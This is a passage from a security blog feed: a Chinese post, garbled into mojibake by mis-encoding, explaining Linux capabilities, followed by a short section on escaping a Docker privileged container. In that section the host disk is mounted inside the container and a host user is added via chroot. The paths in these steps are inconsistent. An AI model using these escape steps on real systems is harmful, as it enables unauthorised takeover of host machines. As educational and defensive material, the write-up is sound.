<h2 id="æœ‰å“ªäº›">æœ‰å“ªäº›ï¼Ÿ</h2>
<table>
<thead>
<tr>
<th>capability åç§°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>CAP_AUDIT_CONTROL</td>
<td>å¯ç”¨å’Œç¦ç”¨å†…æ ¸å®¡è®¡ï¼›æ”¹å˜å®¡è®¡è¿‡æ»¤è§„åˆ™ï¼›æ£€ç´¢å®¡è®¡çŠ¶æ€å’Œè¿‡æ»¤è§„åˆ™</td>
</tr>
<tr>
<td>CAP_AUDIT_READ</td>
<td>å…è®¸é€šè¿‡ multicast netlink å¥—æ¥å­—è¯»å–å®¡è®¡æ—¥å¿—</td>
</tr>
<tr>
<td>CAP_AUDIT_WRITE</td>
<td>å°†è®°å½•å†™å…¥å†…æ ¸å®¡è®¡æ—¥å¿—</td>
</tr>
<tr>
<td>CAP_BLOCK_SUSPEND</td>
<td>ä½¿ç”¨å¯ä»¥é˜»æ­¢ç³»ç»ŸæŒ‚èµ·çš„ç‰¹æ€§</td>
</tr>
<tr>
<td>CAP_CHOWN</td>
<td>ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™</td>
</tr>
<tr>
<td>CAP_DAC_OVERRIDE</td>
<td>å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶</td>
</tr>
<tr>
<td>CAP_DAC_READ_SEARCH</td>
<td>å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„ DAC è®¿é—®é™åˆ¶</td>
</tr>
<tr>
<td>CAP_FOWNER</td>
<td>å¿½ç•¥æ–‡ä»¶å±ä¸» ID å¿…é¡»å’Œè¿›ç¨‹ç”¨æˆ· ID ç›¸åŒ¹é…çš„é™åˆ¶</td>
</tr>
<tr>
<td>CAP_FSETID</td>
<td>å…è®¸è®¾ç½®æ–‡ä»¶çš„ setuid ä½</td>
</tr>
<tr>
<td>CAP_IPC_LOCK</td>
<td>å…è®¸é”å®šå…±äº«å†…å­˜ç‰‡æ®µ</td>
</tr>
<tr>
<td>CAP_IPC_OWNER</td>
<td>å¿½ç•¥ IPC æ‰€æœ‰æƒæ£€æŸ¥</td>
</tr>
<tr>
<td>CAP_KILL</td>
<td>å…è®¸å¯¹ä¸å±äºè‡ªå·±çš„è¿›ç¨‹å‘é€ä¿¡å·</td>
</tr>
<tr>
<td>CAP_LEASE</td>
<td>å…è®¸ä¿®æ”¹æ–‡ä»¶é”çš„ FL_LEASE æ ‡å¿—</td>
</tr>
<tr>
<td>CAP_LINUX_IMMUTABLE</td>
<td>å…è®¸ä¿®æ”¹æ–‡ä»¶çš„ IMMUTABLE å’Œ APPEND å±æ€§æ ‡å¿—</td>
</tr>
<tr>
<td>CAP_MAC_ADMIN</td>
<td>å…è®¸ MAC é…ç½®æˆ–çŠ¶æ€æ›´æ”¹</td>
</tr>
<tr>
<td>CAP_MAC_OVERRIDE</td>
<td>å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶</td>
</tr>
<tr>
<td>CAP_MKNOD</td>
<td>å…è®¸ä½¿ç”¨ mknod() ç³»ç»Ÿè°ƒç”¨</td>
</tr>
<tr>
<td>CAP_NET_ADMIN</td>
<td>å…è®¸æ‰§è¡Œç½‘ç»œç®¡ç†ä»»åŠ¡</td>
</tr>
<tr>
<td>CAP_NET_BIND_SERVICE</td>
<td>å…è®¸ç»‘å®šåˆ°å°äº 1024 çš„ç«¯å£</td>
</tr>
<tr>
<td>CAP_NET_BROADCAST</td>
<td>å…è®¸ç½‘ç»œå¹¿æ’­å’Œå¤šæ’­è®¿é—®</td>
</tr>
<tr>
<td>CAP_NET_RAW</td>
<td>å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­—</td>
</tr>
<tr>
<td>CAP_SETGID</td>
<td>å…è®¸æ”¹å˜è¿›ç¨‹çš„ GID</td>
</tr>
<tr>
<td>CAP_SETFCAP</td>
<td>å…è®¸ä¸ºæ–‡ä»¶è®¾ç½®ä»»æ„çš„ capabilities</td>
</tr>
<tr>
<td>CAP_SETPCAP</td>
<td>å‚è€ƒ capabilities man page</td>
</tr>
<tr>
<td>CAP_SETUID</td>
<td>å…è®¸æ”¹å˜è¿›ç¨‹çš„ UID</td>
</tr>
<tr>
<td>CAP_SYS_ADMIN</td>
<td>å…è®¸æ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚åŠ è½½æˆ–å¸è½½æ–‡ä»¶ç³»ç»Ÿã€è®¾ç½®ç£ç›˜é…é¢ç­‰</td>
</tr>
<tr>
<td>CAP_SYS_BOOT</td>
<td>å…è®¸é‡æ–°å¯åŠ¨ç³»ç»Ÿ</td>
</tr>
<tr>
<td>CAP_SYS_CHROOT</td>
<td>å…è®¸ä½¿ç”¨ chroot() ç³»ç»Ÿè°ƒç”¨</td>
</tr>
<tr>
<td>CAP_SYS_MODULE</td>
<td>å…è®¸æ’å…¥å’Œåˆ é™¤å†…æ ¸æ¨¡å—</td>
</tr>
<tr>
<td>CAP_SYS_NICE</td>
<td>å…è®¸æå‡ä¼˜å…ˆçº§åŠè®¾ç½®å…¶ä»–è¿›ç¨‹çš„ä¼˜å…ˆçº§</td>
</tr>
<tr>
<td>CAP_SYS_PACCT</td>
<td>å…è®¸æ‰§è¡Œè¿›ç¨‹çš„ BSD å¼å®¡è®¡</td>
</tr>
<tr>
<td>CAP_SYS_PTRACE</td>
<td>å…è®¸è·Ÿè¸ªä»»ä½•è¿›ç¨‹</td>
</tr>
<tr>
<td>CAP_SYS_RAWIO</td>
<td>å…è®¸ç›´æ¥è®¿é—® /devportã€/dev/memã€/dev/kmem åŠåŸå§‹å—è®¾å¤‡</td>
</tr>
<tr>
<td>CAP_SYS_RESOURCE</td>
<td>å¿½ç•¥èµ„æºé™åˆ¶</td>
</tr>
<tr>
<td>CAP_SYS_TIME</td>
<td>å…è®¸æ”¹å˜ç³»ç»Ÿæ—¶é’Ÿ</td>
</tr>
<tr>
<td>CAP_SYS_TTY_CONFIG</td>
<td>å…è®¸é…ç½® TTY è®¾å¤‡</td>
</tr>
<tr>
<td>CAP_SYSLOG</td>
<td>å…è®¸ä½¿ç”¨ syslog() ç³»ç»Ÿè°ƒç”¨</td>
</tr>
<tr>
<td>CAP_WAKE_ALARM</td>
<td>å…è®¸è§¦å‘ä¸€äº›èƒ½å”¤é†’ç³»ç»Ÿçš„ä¸œè¥¿(æ¯”å¦‚ CLOCK_BOOTTIME_ALARM è®¡æ—¶å™¨)</td>
</tr>
</tbody>
</table>
<h2 id="capabilities-é›†åˆ">capabilities é›†åˆ</h2>
<p>Linux capabilities åˆ†ä¸ºè¿›ç¨‹ï¼ˆProcessesï¼‰ capabilities å’Œæ–‡ä»¶ï¼ˆBinariesï¼‰ capabilitiesã€‚</p>
<h3 id="è¿›ç¨‹processes-capabilities">è¿›ç¨‹ï¼ˆProcessesï¼‰ capabilities</h3>
<p>æ¯ä¸€ä¸ªçº¿ç¨‹ï¼Œå…·æœ‰ 5 ä¸ª capabilities é›†åˆï¼Œæ¯ä¸€ä¸ªé›†åˆä½¿ç”¨ 64 ä½æ©ç æ¥è¡¨ç¤ºï¼Œæ˜¾ç¤ºä¸º 16 è¿›åˆ¶æ ¼å¼ã€‚è¿™ 5 ä¸ª capabilities é›†åˆåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li><strong>Permitted</strong></li>
<li><strong>Effective</strong></li>
<li><strong>Inheritable</strong></li>
<li><strong>Bounding</strong></li>
<li><strong>Ambient</strong></li>
</ul>
<p>æ¯ä¸ªé›†åˆä¸­éƒ½åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ª capabilitiesã€‚è¿™5ä¸ªé›†åˆçš„å…·ä½“å«ä¹‰å¦‚ä¸‹ï¼š</p>
<p><strong>Inherited (CapInh):</strong></p>
<ul>
<li>ç›®çš„ï¼šç¡®å®šä»çˆ¶è¿›ç¨‹ä¼ é€’ä¸‹æ¥çš„ <code>capabilities</code>ã€‚</li>
<li>åŠŸèƒ½ï¼šå½“åˆ›å»ºï¼ˆ<code>exec()</code>ï¼‰ä¸€ä¸ªæ–°è¿›ç¨‹æ—¶ï¼Œå®ƒä¼šä»çˆ¶è¿›ç¨‹ç»§æ‰¿è¿™ä¸ªé›†åˆä¸­çš„ <code>capabilities</code>ã€‚ä¸ä¼šæ·»åŠ åˆ°æ–°çº¿ç¨‹çš„ <code>Effective</code> é›†åˆä¸­ï¼Œå®ƒåªä¼šå½±å“æ–°çº¿ç¨‹çš„ <code>Permitted</code> é›†åˆã€‚</li>
</ul>
<p><strong>Effective (CapEff):</strong></p>
<ul>
<li>ç›®çš„ï¼šè¡¨ç¤ºè¿›ç¨‹åœ¨ä»»ä½•æ—¶åˆ»å®é™…ä½¿ç”¨çš„ <code>capabilities</code>ã€‚</li>
<li>åŠŸèƒ½ï¼šæ˜¯å†…æ ¸æ£€æŸ¥å„ç§æ“ä½œæƒé™æ—¶ä½¿ç”¨çš„<code>capabilities</code>é›†åˆã€‚</li>
</ul>
<p><strong>Permitted (CapPrm)ï¼š</strong></p>
<ul>
<li>ç›®çš„ï¼šå®šä¹‰è¿›ç¨‹å¯ä»¥æ‹¥æœ‰çš„æœ€å¤§<code>capabilities</code>é›†åˆã€‚</li>
<li>åŠŸèƒ½ï¼šçº¿ç¨‹å¯ä»¥ä» <code>Effective</code> æˆ– <code>Inheritable</code> é›†åˆä¸­æ·»åŠ æˆ–åˆ é™¤ <code>capability</code>ï¼Œå‰ææ˜¯æ·»åŠ æˆ–åˆ é™¤çš„ <code>capability</code> å¿…é¡»åŒ…å«åœ¨ <code>Permitted</code> é›†åˆä¸­ã€‚</li>
</ul>
<p><strong>Bounding (CapBnd):</strong></p>
<ul>
<li>ç›®çš„ï¼šé™åˆ¶è¿›ç¨‹åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…å¯è·å¾—çš„<code>capabilities</code>èƒ½åŠ›é›†åˆã€‚</li>
<li>åŠŸèƒ½ï¼šå³ä½¿æŸä¸ª<code>capabilities</code>åœ¨è¿›ç¨‹çš„<code>Inheritable</code>æˆ–<code>Permitted</code>é›†åˆä¸­ï¼Œå®ƒä¹Ÿä¸èƒ½è·å¾—è¯¥<code>capabilities</code>ï¼Œé™¤éå®ƒä¹Ÿåœ¨<code>Bounding</code>é›†åˆä¸­ã€‚</li>
</ul>
<p><strong>Ambient (CapAmb):</strong></p>
<ul>
<li>Linux 4.3 å†…æ ¸æ–°å¢äº†ä¸€ä¸ª capabilities é›†åˆå« Ambient ï¼Œç”¨æ¥å¼¥è¡¥ Inheritable çš„ä¸è¶³ã€‚Ambient å…·æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š
<ul>
<li><code>Permitted</code> å’Œ <code>Inheritable</code> æœªè®¾ç½®çš„ <code>capabilities</code>ï¼Œ<code>Ambient</code> ä¹Ÿä¸èƒ½è®¾ç½®ã€‚</li>
<li>å½“ <code>Permitted</code> å’Œ <code>Inheritable</code> å…³é—­æŸæƒé™ï¼ˆæ¯”å¦‚ <code>CAP_SYS_BOOT</code>ï¼‰åï¼Œ<code>Ambient</code> ä¹Ÿéšä¹‹å…³é—­å¯¹åº”æƒé™ã€‚è¿™æ ·å°±ç¡®ä¿äº†é™ä½æƒé™åå­è¿›ç¨‹ä¹Ÿä¼šé™ä½æƒé™ã€‚</li>
<li>éç‰¹æƒç”¨æˆ·å¦‚æœåœ¨ <code>Permitted</code> é›†åˆä¸­æœ‰ä¸€ä¸ª <code>capability</code>ï¼Œé‚£ä¹ˆå¯ä»¥æ·»åŠ åˆ° <code>Ambient</code> é›†åˆä¸­ï¼Œè¿™æ ·å®ƒçš„å­è¿›ç¨‹ä¾¿å¯ä»¥åœ¨ <code>Ambient</code>ã€<code>Permitted</code> å’Œ <code>Effective</code> é›†åˆä¸­è·å–è¿™ä¸ª <code>capability</code></li>
<li>æœ‰ç‚¹æŠ½è±¡ï¼Œåœ¨å…·ä½“çš„ä½¿ç”¨åœºæ™¯æ„Ÿå—</li>
</ul>
</li>
</ul>
<h3 id="æ–‡ä»¶binaries-capabilities">æ–‡ä»¶ï¼ˆBinariesï¼‰ capabilities</h3>
<p>æ–‡ä»¶çš„ capabilities åŠŸèƒ½ï¼Œéœ€è¦æ–‡ä»¶ç³»ç»Ÿçš„æ”¯æŒã€‚å¦‚æœæ–‡ä»¶ç³»ç»Ÿä½¿ç”¨äº† nouuid é€‰é¡¹è¿›è¡ŒæŒ‚è½½ï¼Œé‚£ä¹ˆæ–‡ä»¶çš„ capabilities å°†ä¼šè¢«å¿½ç•¥ã€‚</p>
<p>ç±»ä¼¼äºçº¿ç¨‹çš„ capabilitiesï¼Œæ–‡ä»¶çš„ capabilities åŒ…å«äº† 3 ä¸ªé›†åˆï¼š</p>
<ul>
<li>Permitted</li>
<li>Inheritable</li>
<li>Effective</li>
</ul>
<p>å’Œçº¿ç¨‹ capabilities æœ‰è¾ƒå¤§å·®å¼‚çš„æ˜¯<code>Effective</code>é›†åˆï¼š</p>
<p><strong>Effective</strong><br>
è¿™ä¸æ˜¯ä¸€ä¸ªé›†åˆï¼Œä»…ä»…æ˜¯ä¸€ä¸ªæ ‡å¿—ä½ã€‚å¦‚æœè®¾ç½®å¼€å¯ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œå®Œ <code>execve()</code> åï¼Œçº¿ç¨‹ <code>Permitted</code> é›†åˆä¸­çš„ <code>capabilities</code> ä¼šè‡ªåŠ¨æ·»åŠ åˆ°å®ƒçš„ Effective é›†åˆä¸­ã€‚å¯¹äºä¸€äº›æ—§çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”±äºå…¶ä¸ä¼šè°ƒç”¨ capabilities ç›¸å…³å‡½æ•°è®¾ç½®è‡ªèº«çš„ <code>Effective</code> é›†åˆï¼Œæ‰€ä»¥å¯ä»¥å°†å¯æ‰§è¡Œæ–‡ä»¶çš„ Effective bit å¼€å¯ï¼Œä»è€Œå¯ä»¥å°† <code>Permitted</code> é›†åˆä¸­çš„ capabilities è‡ªåŠ¨æ·»åŠ åˆ° <code>Effective</code> é›†åˆä¸­ã€‚</p>
<h2 id="å…¬å¼è¿è¡Œ-execve-å-capabilities-çš„å˜åŒ–">å…¬å¼ï¼šè¿è¡Œ execve() å capabilities çš„å˜åŒ–</h2>
<p>æˆ‘ä»¬ç”¨ <code>P</code> ä»£è¡¨<strong>æ‰§è¡Œ execve() å‰çº¿ç¨‹çš„ capabilities</strong>ï¼Œ<code>P'</code> ä»£è¡¨<strong>æ‰§è¡Œ execve() åçº¿ç¨‹çš„ capabilities</strong>ï¼Œ<code>F</code> ä»£è¡¨<strong>å¯æ‰§è¡Œæ–‡ä»¶çš„ capabilities</strong>ã€‚é‚£ä¹ˆï¼š</p>
<pre><code>Pâ€™(ambient) = (file is privileged) ? 0 : P(ambient)

Pâ€™(permitted) = (P(inheritable) &amp; F(inheritable)) |
                (F(permitted) &amp; P(bounding))) | 
                Pâ€™(ambient)

Pâ€™(effective)   = F(effective) ? Pâ€™(permitted) : Pâ€™(ambient)

Pâ€™(inheritable) = P(inheritable) [i.e., unchanged]

Pâ€™(bounding) = P(bounding) [i.e., unchanged]
</code></pre>
<p>æ³¨ï¼š</p>
<ul>
<li>ä¸Šé¢çš„å…¬å¼æ˜¯é’ˆå¯¹ç³»ç»Ÿè°ƒç”¨ <code>execve()</code> çš„ï¼Œå¦‚æœæ˜¯ <code>fork()</code>ï¼Œé‚£ä¹ˆå­çº¿ç¨‹çš„ capabilities ä¿¡æ¯å®Œå…¨å¤åˆ¶çˆ¶è¿›ç¨‹çš„ capabilities ä¿¡æ¯ã€‚</li>
</ul>
<h2 id="capabilities-æ“ä½œ">capabilities æ“ä½œ</h2>
<h3 id="æŸ¥çœ‹-capabilities">æŸ¥çœ‹ capabilities</h3>
<p>ç›¸å…³å·¥å…·ï¼š<code>libcap-ng</code></p>
<p>å®‰è£…ï¼ˆCentosï¼‰ï¼š<code>yum install libcap-ng-utils</code></p>
<p>ä½¿ç”¨<code>/proc/&lt;pid&gt;/status</code>æŸ¥çœ‹è¿›ç¨‹capabilities</p>
<pre><code class="language-shell">cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
</code></pre>
<p>é€šå¸¸æœ‰5è¡Œ</p>
<pre><code>CapInh:	0000000000000000
CapPrm:	0000001fffffffff
CapEff:	0000001fffffffff
CapBnd:	0000001fffffffff
CapAmb:	0000000000000000
</code></pre>
<p>ä½¿ç”¨<code>capsh</code>è§£ç è®©å…¶å¯è¯»</p>
<pre><code># capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36,37
</code></pre>
<p>ä½¿ç”¨ getpcaps å·¥å…·</p>
<pre><code># ping baidu.com &gt; /dev/null&amp;
[1] 9227
# getpcaps 9227
Capabilities for `9227': = cap_net_admin,cap_net_raw+p
# cat /proc/9227/status | grep Cap
CapInh:	0000000000000000
CapPrm:	0000000000003000
CapEff:	0000000000000000
CapBnd:	0000001fffffffff
CapAmb:	0000000000000000
# capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
</code></pre>
<p>æ³¨æ„åˆ°è¿™é‡Œå¯åŠ¨çš„ ping å®ƒçš„ CapEff æ˜¯ 0ï¼Œè¿™ç‚¹åé¢ä¼šæï¼ˆåº”è¯¥ï¼‰</p>
<p>æ–‡ä»¶capabilitiesæŸ¥çœ‹</p>
<pre><code>getcap /usr/bin/ping
/usr/bin/ping = cap_net_admin,cap_net_raw+p

###
capability[,capabilityâ€¦]+(e|i|p)ï¼Œå…¶ä¸­ e è¡¨ç¤º effectiveï¼Œi è¡¨ç¤º inheritableï¼Œp è¡¨ç¤º permittedã€‚ä¸åŒçš„åˆ†ç»„ä¹‹é—´é€šè¿‡ç©ºæ ¼éš”å¼€ï¼Œä¾‹å¦‚ï¼šCurrent: = cap_sys_chroot+ep cap_net_bind_service+eipã€‚å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œcap_net_bind_service+e cap_net_bind_service+ip å’Œ cap_net_bind_service+eip ç­‰ä»·ã€‚
</code></pre>
<p>éå†ç›®å½•ä¸‹æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶çš„capabilitiesï¼ˆ<code>2&gt;/dev/null</code> åˆ™æ˜¯å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ° <code>/dev/null</code>ï¼Œå³å¿½ç•¥é”™è¯¯æ¶ˆæ¯ï¼‰</p>
<pre><code># getcap -r / 2&gt;/dev/null
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/newgidmap = cap_setgid+ep
</code></pre>
<h3 id="ä½¿ç”¨capshè®¾ç½®çš„æ–°shell">ä½¿ç”¨capshè®¾ç½®çš„æ–°shell</h3>
<p>ä½¿ç”¨ capsh å·¥å…·åœ¨è¿è¡Œ ping ä¹‹å‰ç§»é™¤ CAP_NET_RAW capabilitiesï¼Œå¹¶è¾“å‡ºå½“å‰æƒé™è®¾ç½®ã€‚</p>
<pre><code># capsh --drop=cap_net_raw --print -- -c &quot;ping baidu.com&quot;
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root),994(docker)
ping: socket: ä¸å…è®¸çš„æ“ä½œ
</code></pre>
<h3 id="ä½¿ç”¨setcapè®¾ç½®æ–‡ä»¶çš„capabilities">ä½¿ç”¨setcapè®¾ç½®æ–‡ä»¶çš„capabilities</h3>
<p>è®¾ç½®æ–°çš„é™åˆ¶</p>
<pre><code>setcap cap_net_admin+p /usr/bin/ping
</code></pre>
<p>ä¹Ÿå¯ä»¥æ¸…ç©ºcapabilities</p>
<pre><code>setcap -r &lt;/path/to/binary&gt;
</code></pre>
<h2 id="å…·æœ‰-capabilities-æ„ŸçŸ¥èƒ½åŠ›çš„æ–‡ä»¶">å…·æœ‰ capabilities æ„ŸçŸ¥èƒ½åŠ›çš„æ–‡ä»¶</h2>
<p>è¿™éƒ¨åˆ†çš„å†…å®¹å¼€å§‹çœ‹çš„æ—¶å€™æœ‰ç‚¹éš¾ç†è§£ï¼Œä¹‹ååœ¨HackTrickæ‰¾äº†æ®µè‹±æ–‡çš„è§£é‡Š</p>
<blockquote>
<p>The capability-aware binaries won't use the new capabilities given by the environment, however the capability dumb binaries will use them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.</p>
</blockquote>
<p><strong>Capability-aware Binariesï¼ˆå…·æœ‰èƒ½åŠ›æ„ŸçŸ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼š</strong></p>
<ul>
<li>è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯è®¾è®¡å’Œç¼–å†™æ—¶è€ƒè™‘åˆ° Linux capabilities çš„ã€‚å› æ­¤ï¼Œå®ƒä»¬ä¼šæ˜¾å¼åœ°æ£€æŸ¥å’Œç®¡ç†å®ƒä»¬éœ€è¦çš„ capabilitiesã€‚</li>
<li>å½“è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶åœ¨å…·æœ‰é¢å¤– capabilities çš„ç¯å¢ƒä¸­è¿è¡Œæ—¶ï¼Œå®ƒä»¬ä¸ä¼šè‡ªåŠ¨ä½¿ç”¨è¿™äº›æ–°æˆäºˆçš„ capabilitiesã€‚ç›¸åï¼Œå®ƒä»¬ä¼šæ£€æŸ¥å½“å‰çš„ capabilities è®¾ç½®ï¼Œå¹¶å†³å®šæ˜¯å¦ä½¿ç”¨è¿™äº›æƒé™ã€‚</li>
</ul>
<p><strong>Capability-dumb Binariesï¼ˆä¸å…·å¤‡èƒ½åŠ›æ„ŸçŸ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼š</strong></p>
<ul>
<li>è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç¼–å†™æ—¶æ²¡æœ‰è€ƒè™‘ Linux capabilitiesï¼Œå®ƒä»¬å¯¹è¿™äº›æƒé™çš„å­˜åœ¨æˆ–ä¸å­˜åœ¨ä¸æ•æ„Ÿã€‚</li>
<li>å½“è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶åœ¨å…·æœ‰é¢å¤– capabilities çš„ç¯å¢ƒä¸­è¿è¡Œæ—¶ï¼Œå®ƒä»¬ä¸ä¼šä¸»åŠ¨æ‹’ç»è¿™äº›æ–°æˆäºˆçš„ capabilitiesã€‚å› æ­¤ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨æ‹¥æœ‰å¹¶ä½¿ç”¨è¿™äº›æƒé™ã€‚</li>
</ul>
<p>ç»“åˆæ–‡ç« <code>ping</code>å‘½ä»¤çš„å®éªŒå°±å¥½ç†è§£äº†ï¼š<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-2/">https://icloudnative.io/posts/linux-capabilities-in-practice-2/</a></p>
<h1 id="privileged-ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸">Privileged ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸</h1>
<p>å½“ä½¿ç”¨--privileged=trueé€‰é¡¹è¿è¡Œå®¹å™¨æ—¶ï¼ŒDockerä¼šèµ‹äºˆå®¹å™¨å‡ ä¹ä¸ä¸»æœºç›¸åŒçš„æƒé™4ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªé€‰é¡¹åšäº†ä»¥ä¸‹ä¸¤ä»¶äº‹æƒ…ï¼š</p>
<ul>
<li>ç»™å®¹å™¨æ·»åŠ äº†æ‰€æœ‰çš„capabilities</li>
<li>å…è®¸å®¹å™¨è®¿é—®ä¸»æœºçš„æ‰€æœ‰è®¾å¤‡</li>
</ul>
<pre><code class="language-shell">docker run --privileged=true -it ubuntu
</code></pre>
<p>åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œä»è€Œåˆ¤æ–­å®¹å™¨æ˜¯ä¸æ˜¯ç‰¹æƒæ¨¡å¼ï¼Œå¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEff å¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffff æˆ–è€…æ˜¯ 0000001fffffffff</p>
<pre><code class="language-shell">cat /proc/$$/status | grep CapEff
</code></pre>
<p>æŸ¥çœ‹æŒ‚è½½ç£ç›˜è®¾å¤‡</p>
<pre><code class="language-shell">fdisk -l
Disk /dev/vda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x000beb6e

Device     Boot Start      End  Sectors Size Id Type
/dev/vda1  *     2048 83886046 83883999  40G 83 Linux
</code></pre>
<p>åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†å®¿ä¸»æœºæ–‡ä»¶æŒ‚è½½åˆ° /test ç›®å½•ä¸‹</p>
<pre><code class="language-shell">mkdir /test &amp;&amp; mount /dev/vda1 /test
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715348908477.png" alt="" loading="lazy"></figure>
<p>æ–¹æ³•ä¸€ï¼šå†™è®¡åˆ’ä»»åŠ¡</p>
<p>æ–¹æ³•äºŒï¼š</p>
<pre><code class="language-shell">chroot /mnt adduser john
</code></pre>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<p><a href="https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/">Linux Capabilities å…¥é—¨æ•™ç¨‹ï¼šæ¦‚å¿µç¯‡</a><br>
<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-1/">Linux Capabilities å…¥é—¨æ•™ç¨‹ï¼šåŸºç¡€å®æˆ˜ç¯‡</a><br>
<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-2/">Linux Capabilities å…¥é—¨æ•™ç¨‹ï¼šè¿›é˜¶å®æˆ˜ç¯‡</a><br>
<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">HackTricks - Linux Capabilities</a><br>
<a href="https://blog.csdn.net/Dontla/article/details/132996095">docker runï¼š--privileged=trueé€‰é¡¹è§£æï¼ˆç‰¹æƒæ¨¡å¼ï¼šèµ‹äºˆå®¹å™¨å‡ ä¹ä¸ä¸»æœºç›¸åŒçš„æƒé™ï¼‰-CSDNåšå®¢</a><br>
<a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">Privileged ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SpELè¡¥å……]]></title>
        <id>https://skyblu3519.github.io/post/spel-bu-chong/</id>
        <link href="https://skyblu3519.github.io/post/spel-bu-chong/">
        </link>
        <updated>2024-05-04T16:04:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯el">ä»€ä¹ˆæ˜¯ELï¼Ÿ</h1>
